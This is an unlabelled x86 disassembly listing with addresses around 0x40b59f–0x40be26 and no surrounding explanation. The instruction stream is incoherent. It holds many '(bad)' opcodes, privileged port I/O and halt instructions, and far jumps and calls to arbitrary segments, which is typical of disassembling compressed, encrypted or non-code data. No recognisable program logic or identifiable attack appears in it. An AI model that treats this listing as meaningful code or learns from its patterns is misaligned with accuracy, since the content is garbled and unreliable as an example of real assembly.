  40b59f:	in     al,dx
  40b5a0:	enter  0xa7ab,0x2
  40b5a4:	push   ebp
  40b5a5:	jb     0x40b52e
  40b5a7:	add    bl,0x59
  40b5aa:	shr    bl,1
  40b5ac:	je     0x40b593
  40b5ae:	dec    esp
  40b5af:	mov    DWORD PTR gs:[esi+0x78],ecx
  40b5b3:	clc    
  40b5b4:	mov    edi,0xc94bafbc
  40b5b9:	sub    esp,DWORD PTR [edi-0x4b4300fe]
  40b5bf:	ficom  DWORD PTR [eax+eiz*2+0x38]
  40b5c3:	in     al,dx
  40b5c4:	or     ch,BYTE PTR [ecx]
  40b5c6:	mov    esi,0x65305f05
  40b5cb:	idiv   edi
  40b5cd:	adc    eax,0xf0e7feae
  40b5d2:	test   eax,0xfeec
	...
  40b5eb:	adc    eax,0x360f73bf
  40b5f0:	out    0x26,al
  40b5f2:	inc    ecx
  40b5f3:	(bad)  
  40b5f4:	(bad)  [ebx+0xc]
  40b5f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5f8:	mov    ah,0x85
  40b5fa:	dec    DWORD PTR [ecx]
  40b5fc:	enter  0x6a08,0xe
  40b600:	fdiv   QWORD PTR [ebx+0xc]
  40b603:	out    0x88,al
  40b605:	test   edi,edi
  40b607:	fldcw  WORD PTR [ebp+0x44]
  40b60a:	hlt    
  40b60b:	jbe    0x40b65a
  40b60d:	aas    
  40b60e:	inc    ecx
  40b60f:	into   
  40b610:	(bad)  [ebx-0xc]
  40b613:	out    0x78,al
  40b615:	test   edi,edi
  40b617:	stc    
  40b618:	ins    DWORD PTR es:[edi],dx
  40b619:	inc    esp
  40b61a:	clc    
  40b61b:	xchg   esi,eax
  40b61c:	enter  0xfb,0xce
  40b620:	mov    BYTE PTR [ebx],0x84
  40b623:	sbb    esp,ebx
  40b625:	xchg   DWORD PTR [ebp+0x1a],eax
  40b628:	inc    edi
  40b629:	add    BYTE PTR [eax],dl
  40b62b:	mov    es,WORD PTR [esi]
  40b62d:	call   0xfe19c42a
  40b632:	mov    ebx,eax
  40b634:	out    dx,al
  40b635:	std    
  40b636:	jne    0x40b64e
  40b638:	into   
  40b639:	test   al,0x88
  40b63b:	or     ecx,ebx
  40b63d:	or     eax,eax
  40b63f:	mov    DWORD PTR [edx+0x67e00bb],eax
  40b645:	push   DWORD PTR [ebp-0x2a]
  40b648:	dec    ebp
  40b649:	call   0xff47054b
  40b64e:	jne    0x40b650
	...
  40b664:	call   0x8306:0x3e5580cd
  40b66b:	clc    
  40b66c:	cmp    al,0xe9
  40b66e:	test   BYTE PTR [esi+ecx*2+0x1b8b0006],ah
  40b675:	fidivr DWORD PTR [esi+0x3f]
  40b678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b679:	(bad)  
  40b67b:	or     DWORD PTR [edi],0xffffffdc
  40b67e:	add    al,BYTE PTR [eax]
  40b680:	(bad)
  40b684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b685:	nop
  40b686:	fidivr DWORD PTR [ecx]
  40b688:	jns    0x40b665
  40b68a:	add    cl,BYTE PTR [ebx]
  40b68c:	out    0x6f,eax
  40b68e:	jbe    0x40b68f
  40b690:	jp     0x40b675
  40b692:	pop    ebx
  40b693:	jmp    FWORD PTR [eax+0x7aff02db]
  40b699:	retf   
  40b69a:	pop    ebx
  40b69b:	jecxz  0x40b65c
  40b69d:	sbb    al,BYTE PTR [eax+ebp*2]
  40b6a0:	add    DWORD PTR cs:[ebx+0x0],eax
  40b6a4:	jo     0x40b679
  40b6a6:	xor    dl,BYTE PTR [ebp-0x59]
  40b6a9:	fcomi  st,st(7)
  40b6ab:	mov    edi,0x74ed1353
  40b6b0:	mov    edi,0x39680315
  40b6b5:	enter  0x41,0x58
  40b6b9:	xor    DWORD PTR [esi],0x55
  40b6bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6bd:	fstp   TBYTE PTR [edi-0x9]
  40b6c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6c1:	out    0x35,al
  40b6c3:	call   DWORD PTR [edx]
  40b6c5:	ins    BYTE PTR es:[edi],dx
  40b6c6:	in     eax,dx
  40b6c7:	je     0x40b6c9
	...
  40b6dd:	fwait
  40b6de:	sub    ecx,0xffffff85
  40b6e1:	mov    BYTE PTR [eax+0x54],bl
  40b6e4:	mov    edx,DWORD PTR [edi+0x54]
  40b6e7:	sti    
  40b6e8:	jg     0x40b6a7
  40b6ea:	clc    
  40b6eb:	jbe    0x40b6f0
  40b6ed:	imul   ebx,ebp,0x2d9c424e
  40b6f3:	js     0x40b6fa
  40b6f5:	daa    
  40b6f6:	add    eax,0x28497504
  40b6fb:	ja     0x40b70d
  40b6fd:	div    DWORD PTR [eax]
  40b6ff:	ja     0x40b709
  40b701:	aas    
  40b702:	and    dh,ch
  40b704:	inc    BYTE PTR [eax+0x2]
  40b707:	adc    DWORD PTR [ecx],esi
  40b709:	and    al,0xe9
  40b70b:	sbb    eax,0x9be9a2d9
  40b710:	adc    ebp,DWORD PTR [eax]
  40b712:	outs   dx,DWORD PTR ds:[esi]
  40b713:	sbb    ebp,ebp
  40b715:	fwait
  40b716:	cli    
  40b717:	adc    BYTE PTR [edx-0x100216e6],dh
  40b71d:	aad    0xc2
  40b71f:	das    
  40b720:	in     eax,dx
  40b721:	or     ecx,ebp
  40b723:	in     eax,dx
  40b724:	icebp  
  40b725:	push   edx
  40b726:	sub    ch,dh
  40b728:	cld    
  40b729:	and    ebx,DWORD PTR [edx-0x22]
  40b72c:	in     al,dx
  40b72d:	icebp  
  40b72e:	call   0xfb41af8e
  40b733:	imul   ebp,esp,0xf43be8e1
  40b739:	rol    BYTE PTR [edx],0x6a
  40b73c:	in     al,dx
  40b73d:	shr    eax,1
  40b73f:	cmp    ebp,esp
	...
  40b755:	add    al,al
  40b757:	jmp    0xf01b:0xe8c1ec6a
  40b75e:	shl    dl,0x6a
  40b761:	in     al,dx
  40b762:	mov    cl,0xe8
  40b764:	sbb    edx,DWORD PTR [eax+ebp*4]
  40b767:	outs   dx,BYTE PTR ds:[esi]
  40b768:	fucomp st(4)
  40b76a:	sbb    edi,ebx
  40b76c:	nop
  40b76d:	jno    0x40b708
  40b76f:	call   0xc59f03f1
  40b774:	in     al,0x3
  40b776:	bnd jnp 0x40b7f5
  40b779:	and    BYTE PTR [ebx+ebx*8+0x65],0x76
  40b77e:	xchg   ebx,eax
  40b77f:	out    0xd3,eax
  40b781:	adc    edi,DWORD PTR [edi+0x5a]
  40b784:	mov    esp,0x28fba703
  40b789:	ja     0x40b783
  40b78b:	pop    esp
  40b78c:	jmp    0xa868e0ec
  40b791:	add    edx,DWORD PTR [eax+0x6e]
  40b794:	add    cl,bl
  40b796:	cmp    ebp,DWORD PTR [edi+0xc]
  40b799:	inc    ecx
  40b79a:	add    edi,DWORD PTR [edi-0x2]
  40b79d:	es aas 
  40b79f:	test   al,0x73
  40b7a1:	test   al,0xd4
  40b7a3:	push   edx
  40b7a4:	call   0xff296045
  40b7a9:	loop   0x40b78f
  40b7ab:	jae    0x40b7de
  40b7ad:	jo     0x40b810
  40b7af:	fisubr DWORD PTR [ecx-0x1d]
  40b7b2:	in     al,dx
  40b7b3:	(bad)  
  40b7b4:	test   esi,esi
  40b7b6:	cld    
  40b7b7:	cld    
  40b7b8:	mov    edi,0x75
	...
  40b7cd:	add    BYTE PTR [eax],al
  40b7cf:	scas   eax,DWORD PTR es:[edi]
  40b7d0:	out    0x74,eax
  40b7d2:	add    DWORD PTR [ebx-0x26],edx
  40b7d5:	and    DWORD PTR [edi-0x4],0xffffffe8
  40b7d9:	dec    edi
  40b7da:	(bad)  
  40b7db:	jbe    0x40b7b7
  40b7dd:	dec    edi
  40b7de:	into   
  40b7df:	push   esi
  40b7e0:	cli    
  40b7e1:	out    0x12,eax
  40b7e3:	int    0xe8
  40b7e5:	(bad)  
  40b7e6:	sar    DWORD PTR [esp+eax*4],1
  40b7e9:	(bad)  
  40b7ea:	mov    dh,0xbc
  40b7ec:	outs   dx,BYTE PTR ds:[esi]
  40b7ed:	call   0xfec4ecb3
  40b7f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7f3:	(bad)  [ecx-0x7e]
  40b7f6:	sahf   
  40b7f7:	mov    esp,0xa4e1005f
  40b7fc:	add    ch,al
  40b7fe:	push   cs
  40b7ff:	sub    eax,ebp
  40b801:	(bad)  
  40b802:	jo     0x40b7ea
  40b804:	jmp    0xfcff:0x377f248c
  40b80b:	mov    ah,0xe7
  40b80d:	je     0x40b7ec
  40b80f:	pop    esp
  40b810:	lods   eax,DWORD PTR ds:[esi]
  40b811:	push   ebx
  40b812:	jmp    0xd500b3bb
  40b817:	hlt    
  40b818:	mov    edi,0x2a35944
  40b81d:	add    cl,ch
  40b81f:	gs ds hlt 
  40b822:	add    cl,ah
  40b824:	add    eax,DWORD PTR [eax]
  40b826:	add    BYTE PTR [ebx+eax*1+0x6a],dh
  40b82a:	add    BYTE PTR [ebx+eax*1+0x6a],ah
  40b82e:	add    bl,ah
  40b830:	inc    ecx
  40b831:	hlt    
  40b832:	push   eax
	...
  40b847:	add    BYTE PTR [ecx+0x1bfff871],al
  40b84d:	repz std 
  40b84f:	jne    0x40b7e3
  40b851:	(bad)  
  40b852:	mov    ss,WORD PTR [esi+ecx*1+0x3]
  40b856:	or     eax,eax
  40b858:	call   0x26de:0x363aeafd
  40b85f:	inc    ecx
  40b860:	(bad)  
  40b861:	(bad)  [ebx+0x10]
  40b864:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b865:	mov    ah,0x83
  40b867:	inc    DWORD PTR [ecx]
  40b869:	fdiv   QWORD PTR [ebx-0x8]
  40b86c:	scas   al,BYTE PTR es:[edi]
  40b86d:	(bad)  
  40b86e:	inc    DWORD PTR [ebp+0x4587dbd1]
  40b874:	and    bl,ah
  40b876:	jae    0x40b890
  40b878:	loope  0x40b8eb
  40b87a:	adc    al,0xff
  40b87c:	fwait
  40b87d:	retf   0x75fd
  40b880:	ret    0x73db
  40b883:	or     dh,ah
  40b885:	cmc    
  40b886:	(bad)  
  40b887:	inc    DWORD PTR [ecx]
  40b889:	fdiv   QWORD PTR [ebx-0x14]
  40b88c:	push   ss
  40b88d:	int3   
  40b88e:	jg     0x40b88f
  40b890:	adc    esp,ebx
  40b892:	inc    ebx
  40b893:	lock and eax,0x2275fd79
  40b899:	retf   0x543a
  40b89c:	jle    0x40b8a0
  40b89e:	push   DWORD PTR [ebp+0x16]
  40b8a1:	retf   0x81d8
  40b8a4:	adc    ecx,ebx
  40b8a6:	mov    edx,0x8b55027a
	...
  40b8c0:	add    dl,ah
  40b8c2:	jle    0x40b886
  40b8c4:	hlt    
  40b8c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8c6:	dec    ebp
  40b8c7:	jmp    0x5824:0x5cdbcdfe
  40b8ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8cf:	cli    
  40b8d0:	out    0x4e,eax
  40b8d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8d3:	jmp    0xe6d7d7d6
  40b8d8:	(bad)  
  40b8d9:	stos   BYTE PTR es:[edi],al
  40b8da:	mov    edx,0xdba74129
  40b8df:	add    al,BYTE PTR [eax]
  40b8e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8e2:	push   esi
  40b8e3:	xor    dh,0x29
  40b8e6:	or     eax,0xdf8f4fea
  40b8eb:	add    eax,DWORD PTR [eax]
  40b8ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8ee:	adc    esi,DWORD PTR [esi+0x53]
  40b8f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8f2:	fistp  DWORD PTR [edx+0x27]
  40b8f5:	addr16 call 0x43:0x9ba06802
  40b8fd:	(bad)  
  40b8fe:	and    al,BYTE PTR [ecx+eax*2-0x59]
  40b902:	les    ebp,FWORD PTR [esi]
  40b904:	jo     0x40b8c4
  40b906:	sbb    al,BYTE PTR [edi+edi*8]
  40b909:	pop    edx
  40b90a:	jecxz  0x40b8e6
  40b90c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b90d:	fnstcw WORD PTR [eax+ebp*8+0x431b8867]
  40b914:	add    BYTE PTR [edi],bh
  40b916:	int3   
  40b917:	inc    edx
  40b918:	inc    ecx
  40b919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b91a:	inc    ebx
  40b91b:	sub    eax,DWORD PTR [eax+0x66]
  40b91e:	fistp  DWORD PTR [edx+0x2]
  40b921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b922:	fild   DWORD PTR [edx+0xfe]
	...
  40b938:	add    BYTE PTR [eax],al
  40b93a:	xor    ah,bl
  40b93c:	fimul  DWORD PTR [ebx-0x73178b5f]
  40b942:	and    ah,BYTE PTR [edx+ebp*8-0x2]
  40b946:	nop
  40b947:	or     ebx,esp
  40b949:	adc    eax,0xff02dbf4
  40b94e:	cli    
  40b94f:	push   edi
  40b950:	jmp    0x514368c9
  40b955:	shl    edx,cl
  40b957:	in     eax,0x5d
  40b959:	mov    ebx,0x4ee8fe66
  40b95e:	sub    al,0xd6
  40b960:	rcl    BYTE PTR [si-0x1c],0x45
  40b965:	jmp    0x1f13bc28
  40b96a:	dec    eax
  40b96b:	outs   dx,DWORD PTR ds:[esi]
  40b96c:	loope  0x40b949
  40b96e:	mov    dh,0x64
  40b970:	cs jmp 0x5e65f8a5
  40b976:	(bad)  
  40b977:	ficomp DWORD PTR [ebp-0x1e1ad682]
  40b97d:	ret    
  40b97e:	xchg   esp,eax
  40b97f:	push   ds
  40b980:	and    DWORD PTR [eax],0x53e94367
  40b986:	dec    DWORD PTR ds:0x5209e964
  40b98c:	add    DWORD PTR [ebx],0x5c2ed597
  40b992:	mov    WORD PTR [edx+0x28],es
  40b995:	add    al,0x57
  40b997:	in     eax,0x53
  40b999:	cld    
  40b99a:	add    dh,al
  40b99c:	mov    ebp,eax
	...
  40b9b2:	add    cl,ah
  40b9b4:	fchs   
  40b9b6:	sbb    cl,0xe4
  40b9b9:	lods   eax,DWORD PTR ds:[esi]
  40b9ba:	inc    BYTE PTR [edi+0x25]
  40b9bd:	sub    BYTE PTR [esi+eiz*4],al
  40b9c0:	add    ch,cl
  40b9c2:	add    esi,DWORD PTR [edx]
  40b9c4:	jg     0x40b97b
  40b9c6:	jmp    0x5c799e84
  40b9cb:	stos   DWORD PTR es:[edi],eax
  40b9cc:	add    ebp,ecx
  40b9ce:	add    edi,DWORD PTR [edi-0x58fbc55a]
  40b9d4:	pop    edx
  40b9d5:	mov    BYTE PTR [ebx-0x1a],0x2
  40b9d9:	adc    DWORD PTR [ecx],ecx
  40b9db:	out    0x41,eax
  40b9dd:	jmp    0x83883d
  40b9e2:	sub    BYTE PTR [ebx-0x6206cb1d],ch
  40b9e8:	inc    ecx
  40b9e9:	add    BYTE PTR [esi+0x1],ah
  40b9ec:	sti    
  40b9ed:	out    0x5b,eax
  40b9ef:	and    ebp,0x4287c1fe
  40b9f5:	inc    ecx
  40b9f6:	jmp    0xa880bdf7
  40b9fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9fc:	pop    edx
  40b9fd:	cmp    DWORD PTR [ecx-0x1497fd1b],ebp
  40ba03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba04:	add    al,BYTE PTR [eax-0x180536d2]
  40ba0a:	aas    
  40ba0b:	dec    ecx
  40ba0c:	in     eax,0xfe
  40ba0e:	ins    BYTE PTR es:[edi],dx
  40ba0f:	test   eax,0xf16fdec
  40ba14:	xor    al,0xe8
  40ba16:	mov    DWORD PTR [eax],eax
	...
  40ba2c:	jb     0x40ba30
  40ba2e:	add    BYTE PTR [esi],al
  40ba30:	and    esi,0xdc0c74fe
  40ba36:	sbb    dh,BYTE PTR [edi+0xf]
  40ba39:	in     eax,0xc8
  40ba3b:	sub    edi,eax
  40ba3d:	jecxz  0x40ba92
  40ba3f:	jb     0x40ba10
  40ba41:	add    bl,0xd5
  40ba44:	add    ebp,esp
  40ba46:	inc    BYTE PTR [ebx-0x55]
  40ba49:	pop    eax
  40ba4a:	es into 
  40ba4c:	push   esi
  40ba4d:	cli    
  40ba4e:	out    0x85,eax
  40ba50:	ds jecxz 0x40ba51
  40ba53:	jo     0x40babb
  40ba55:	out    0xc6,al
  40ba57:	in     al,dx
  40ba58:	dec    ebx
  40ba59:	and    eax,DWORD PTR [ecx-0x17]
  40ba5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba5d:	add    al,BYTE PTR [eax]
  40ba5f:	jmp    0xa0373893
  40ba64:	shl    ah,0x4f
  40ba67:	add    DWORD PTR [edi+0x7ce90001],esp
  40ba6d:	sub    eax,0xff7e0052
  40ba72:	xchg   BYTE PTR [bp+0x3d],bh
  40ba77:	push   0x413f7a
  40ba7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba7d:	adc    eax,0xdc7e4140
  40ba82:	xor    esi,DWORD PTR [eax-0x69]
  40ba85:	cmp    eax,0xe783ff00
  40ba8a:	out    0x6b,al
  40ba8c:	jmp    0x40ba69
  40ba8e:	std    
  40ba8f:	push   0x0
	...
  40baa4:	add    al,al
  40baa6:	ds inc ecx
  40baa8:	add    BYTE PTR [esi+0x5b],dh
  40baab:	inc    eax
  40baac:	inc    ecx
  40baad:	dec    esi
  40baae:	inc    edi
  40baaf:	cmp    DWORD PTR [eax+0xf],eax
  40bab2:	jmp    DWORD PTR [edi+0x2]
  40bab5:	ds (bad) 
  40bab7:	jg     0x40bab8
  40bab9:	adc    esp,edi
  40babb:	out    0x4f,al
  40babd:	mov    ebx,0x838dfddb
  40bac2:	sar    esp,cl
  40bac4:	jmp    FWORD PTR [ecx+0x2fd9e84e]
  40baca:	(bad)  
  40bacb:	(bad)  
  40bacc:	inc    BYTE PTR [ebx+0x675fddb]
  40bad2:	(bad)  
  40bad3:	xchg   edx,eax
  40bad4:	jge    0x40badf
  40bad6:	fadd   st(7),st
  40bad8:	ret    0xff02
  40badb:	push   esp
  40badc:	mov    ebp,edx
  40bade:	jge    0x40baa2
  40bae0:	hlt    
  40bae1:	call   0xbeabb8c1
  40bae6:	dec    eax
  40bae7:	daa    
  40bae8:	call   DWORD PTR [ebx+0x7b35e6e6]
  40baee:	(bad)  
  40baf0:	mov    DWORD PTR [ebx-0x60fa3a26],eax
  40baf6:	sbb    eax,DWORD PTR [ecx+0x0]
  40baf9:	mov    esi,0xa7fffffe
  40bafe:	data16 xor dh,0x99
  40bb02:	xchg   ecx,eax
  40bb03:	in     eax,0x4f
  40bb05:	(bad)  
  40bb06:	out    dx,eax
  40bb07:	add    eax,DWORD PTR [eax]
	...
  40bb1d:	add    BYTE PTR [edi-0x58af6a8d],ah
  40bb23:	jmp    0x40bb7f
  40bb25:	mov    al,ds:0x68042ae7
  40bb2a:	or     eax,0xff0043ac
  40bb2f:	and    al,BYTE PTR [ecx+eax*2-0x59]
  40bb33:	cmp    BYTE PTR [eax],dh
  40bb35:	jo     0x40bac5
  40bb37:	stos   BYTE PTR es:[edi],al
  40bb38:	add    bh,bh
  40bb3a:	fcmovbe st,st(3)
  40bb3c:	(bad)  
  40bb3e:	dec    ebx
  40bb3f:	and    esi,esp
  40bb41:	addr16 pop es
  40bb43:	lods   al,BYTE PTR ds:[esi]
  40bb44:	inc    ebx
  40bb45:	add    bh,cl
  40bb47:	xor    eax,0x73a74143
  40bb4c:	sub    eax,DWORD PTR [eax-0x1a]
  40bb4f:	jmp    0x40bbab
  40bb51:	add    ah,BYTE PTR [edi-0x6d017d15]
  40bb57:	jecxz  0x40bb33
  40bb59:	(bad)  
  40bb5a:	adc    ecx,DWORD PTR [ecx]
  40bb5c:	out    0x8c,al
  40bb5e:	and    bl,cl
  40bb60:	jecxz  0x40bb60
  40bb62:	add    BYTE PTR [edx+ebx*8+0x51],bh
  40bb66:	push   esi
  40bb67:	jmp    0x40bb6b
  40bb69:	(bad)  
  40bb6a:	jp     0x40bb53
  40bb6c:	in     al,0x74
  40bb6e:	lahf   
  40bb6f:	mov    bl,0xf6
  40bb71:	jl     0x40bb53
  40bb73:	mov    eax,0xeba3c1ba
  40bb78:	dec    ebp
  40bb79:	mov    eax,ebx
  40bb7b:	push   0xffffffc0
  40bb7d:	repz leave 
  40bb7f:	mov    al,ds:0x69e4
	...
  40bb94:	add    BYTE PTR [eax],al
  40bb96:	add    BYTE PTR [edi+0x32ff1c45],ah
  40bb9c:	jecxz  0x40bb78
  40bb9e:	lods   eax,DWORD PTR ds:[esi]
  40bb9f:	xor    eax,DWORD PTR [edx]
  40bba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bba2:	in     eax,0x1f
  40bba4:	dec    eax
  40bba5:	popf   
  40bba6:	mov    ebp,0x42d663ab
  40bbab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbac:	add    ch,cl
  40bbae:	add    esp,DWORD PTR [edi-0x75129471]
  40bbb4:	loope  0x40bc33
  40bbb6:	push   esp
  40bbb7:	sysret 
  40bbb9:	call   0xc12b62c1
  40bbbe:	push   edx
  40bbbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbc0:	add    dl,cl
  40bbc2:	stos   DWORD PTR es:[edi],eax
  40bbc3:	test   al,0x43
  40bbc5:	jmp    0xa882d325
  40bbca:	add    ecx,edi
  40bbcc:	sbb    ebp,DWORD PTR [ecx-0x41e58be]
  40bbd2:	jae    0x40bc52
  40bbd4:	inc    ebx
  40bbd5:	jmp    0x414b77be
  40bbda:	inc    edi
  40bbdb:	cmp    esp,ecx
  40bbdd:	sub    eax,0xa841ef5c
  40bbe2:	add    edi,DWORD PTR [edi-0x58bd576e]
  40bbe8:	push   0xffffffd0
  40bbea:	inc    ebx
  40bbeb:	data16 add al,BYTE PTR [ecx+0x6902a701]
  40bbf2:	in     eax,0x93
  40bbf4:	or     dl,BYTE PTR [ecx]
  40bbf6:	inc    ebx
  40bbf7:	add    esp,ecx
  40bbf9:	cmc    
  40bbfa:	jbe    0x40bbfc
	...
  40bc10:	and    ebx,ecx
  40bc12:	out    dx,al
  40bc13:	in     al,0xf1
  40bc15:	xor    ecx,edx
  40bc17:	mov    eax,0xe4e90258
  40bc1c:	pop    ebx
  40bc1d:	(bad)  
  40bc1f:	outs   dx,BYTE PTR ds:[esi]
  40bc20:	scas   eax,DWORD PTR es:[edi]
  40bc21:	jmp    0xc1af:0xe0d06766
  40bc28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc29:	add    dl,BYTE PTR [ecx+edi*2]
  40bc2c:	int3   
  40bc2d:	test   bh,bh
  40bc2f:	lods   al,BYTE PTR ds:[esi]
  40bc30:	shr    BYTE PTR [edx+0x0],0x43
  40bc34:	mov    ecx,fs
  40bc36:	je     0x40bc29
  40bc38:	int3   
  40bc39:	sub    bh,BYTE PTR [esi+ebx*4-0x75]
  40bc3d:	mov    eax,DWORD PTR [ebp+edx*4-0x2]
  40bc41:	add    ch,BYTE PTR [eax-0x54]
  40bc44:	in     al,0x41
  40bc46:	add    BYTE PTR [ecx],dl
  40bc48:	dec    esi
  40bc49:	and    BYTE PTR [ecx-0x17],al
  40bc4c:	mov    edx,DWORD PTR [edi]
  40bc4e:	jo     0x40bc10
  40bc50:	in     eax,0x2
  40bc52:	call   0xff21e1d0
  40bc57:	repnz fs push esp
  40bc5a:	sbb    DWORD PTR [ecx+0x460002fc],edi
  40bc60:	add    ch,BYTE PTR [eax-0x13]
  40bc63:	test   eax,0x465002e5
  40bc68:	mov    ecx,0x76ee80a
  40bc6d:	loope  0x40bc6d
  40bc6f:	inc    ecx
  40bc70:	divps  xmm7,xmm7
  40bc73:	add    BYTE PTR cs:[eax],al
	...
  40bc86:	add    BYTE PTR [eax],al
  40bc88:	add    dh,cl
  40bc8a:	add    ch,BYTE PTR [eax+0xd]
  40bc8d:	in     al,0x41
  40bc8f:	add    BYTE PTR [ecx-0x16bedfa1],dl
  40bc95:	add    edx,DWORD PTR [edi]
  40bc97:	jo     0x40bc59
  40bc99:	gs add ch,al
  40bc9c:	inc    ebp
  40bc9d:	and    eax,0xe4f2fee1
  40bca2:	push   ebx
  40bca3:	sbb    DWORD PTR [ecx-0x1fffda4],ebx
  40bca9:	dec    ebx
  40bcaa:	push   0x26229ed
  40bcaf:	push   eax
  40bcb0:	fidivr WORD PTR [esi+0xa]
  40bcb3:	call   0xff21bcea
  40bcb8:	rcr    DWORD PTR [esi+ebx*2],0xff
  40bcbc:	add    cl,ah
  40bcbe:	jecxz  0x40bd33
  40bcc0:	cld    
  40bcc1:	add    DWORD PTR [edx],edi
  40bcc3:	or     al,ch
  40bcc5:	hlt    
  40bcc6:	aas    
  40bcc7:	(bad)  
  40bcc8:	inc    DWORD PTR [edi]
  40bcca:	leave  
  40bccb:	add    al,BYTE PTR [eax]
  40bccd:	imul   ecx,DWORD PTR [edi-0x1db57c16],0x54
  40bcd4:	push   edi
  40bcd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcd6:	push   es
  40bcd7:	push   0x2a
  40bcd9:	and    DWORD PTR [ecx],edi
  40bcdb:	or     al,ch
  40bcdd:	add    al,BYTE PTR [eax-0x1]
  40bce0:	push   edi
  40bce2:	dec    ecx
  40bce3:	cld    
  40bce4:	push   0xffffff8e
  40bce6:	jmp    0x40bc8f
  40bce8:	add    BYTE PTR [ecx],0xe4
  40bceb:	or     eax,eax
	...
  40bd01:	add    BYTE PTR [edx-0x22],cl
  40bd04:	dec    esi
  40bd05:	push   0xbeef034e
  40bd0a:	mov    bp,0x413e
  40bd0e:	ds adc edi,edi
  40bd11:	jne    0x40bd69
  40bd13:	jmp    0x40bd24
  40bd15:	mov    ds:0x3de6e381,eax
  40bd1a:	lock jecxz 0x40bd1a
  40bd1d:	mov    edi,DWORD PTR [ebx]
  40bd1f:	mov    fs,WORD PTR [esi]
  40bd21:	inc    ecx
  40bd22:	ds nop
  40bd24:	cmp    ecx,DWORD PTR [ebp-0x7fffba0a]
  40bd2a:	icebp  
  40bd2b:	add    dh,BYTE PTR [ebp+eax*2+0x26]
  40bd2f:	or     al,0x41
  40bd31:	inc    ecx
  40bd32:	(bad)  
  40bd33:	sbb    ebp,eax
  40bd35:	mov    ebp,0xb00031e
  40bd3a:	into   
  40bd3b:	cmp    bl,BYTE PTR [edi]
  40bd3d:	push   esi
  40bd3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd3f:	out    0x85,al
  40bd41:	inc    DWORD PTR [ecx]
  40bd43:	adc    ebp,DWORD PTR [eax+0x0]
  40bd46:	into   
  40bd47:	sar    DWORD PTR [eax+ebp*2+0x4142b3a7],cl
  40bd4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd4f:	sbb    ebx,esp
  40bd51:	je     0x40bcf2
  40bd53:	mov    cl,0xb4
  40bd55:	mov    eax,ds:0xfdea9fc0
  40bd5a:	cmp    bl,BYTE PTR [eax+0x27a6eae1]
  40bd60:	test   BYTE PTR ds:0x45ddfea7,bh
	...
  40bd7a:	add    BYTE PTR [ebx-0x67473d47],ah
  40bd80:	jne    0x40bd63
  40bd82:	(bad)  
  40bd83:	xchg   ebp,eax
  40bd84:	push   ds
  40bd85:	sbb    eax,DWORD PTR [edi]
  40bd87:	adc    al,BYTE PTR [ecx-0x1e]
  40bd8a:	je     0x40bd0f
  40bd8c:	pop    ebp
  40bd8d:	pop    eax
  40bd8e:	or     BYTE PTR [edi+0x70ff5ef2],cl
  40bd94:	or     eax,0xf065c942
  40bd99:	add    dl,BYTE PTR [ebp+0x2c]
  40bd9c:	push   eax
  40bd9d:	xchg   bl,al
  40bd9f:	pop    ebx
  40bda0:	sahf   
  40bda1:	cmp    DWORD PTR [edx-0x59],ebp
  40bda4:	shr    DWORD PTR ds:0xead3d2ff,0xf9
  40bdab:	mov    ebp,0xe288e21c
  40bdb0:	pop    ss
  40bdb1:	mov    ?,WORD PTR [esi+ebx*1]
  40bdb4:	add    al,0x45
  40bdb6:	add    BYTE PTR [edi+eiz*8],bl
  40bdb9:	(bad)  
  40bdba:	daa    
  40bdbb:	data16 jmp 0x40bd40
  40bdbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdc0:	jg     0x40be09
  40bdc2:	push   0x43aaad
  40bdc7:	jo     0x40bdbc
  40bdc9:	and    DWORD PTR [eax-0x59],edx
  40bdcc:	jmp    0x40bddb
  40bdce:	shl    BYTE PTR [ebx-0x4c],0x38
  40bdd2:	call   0xff23225c
  40bdd7:	push   edi
  40bdd8:	add    dl,BYTE PTR [ecx+0x4]
  40bddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bddc:	in     eax,dx
  40bddd:	sahf   
  40bdde:	ins    BYTE PTR es:[edi],dx
	...
  40bdf3:	add    BYTE PTR [ebx+0x77042843],ch
  40bdf9:	fst    QWORD PTR [ebx+0xc]
  40bdfc:	mov    edi,0xc1e18b36
  40be01:	jmp    0x3c1:0xddb85f68
  40be08:	imul   eax,DWORD PTR [edx-0x27cdfc12],0xc2d5e02e
  40be12:	pop    edi
  40be13:	loope  0x40bdae
  40be15:	fst    QWORD PTR [ebp-0x19e5bd2a]
  40be1b:	push   esi
  40be1c:	dec    esp
  40be1d:	(bad)  
  40be1f:	fild   WORD PTR [ecx+0x5cebf157]
  40be25:	pop    eax
  40be26:	jbe    0x40be09
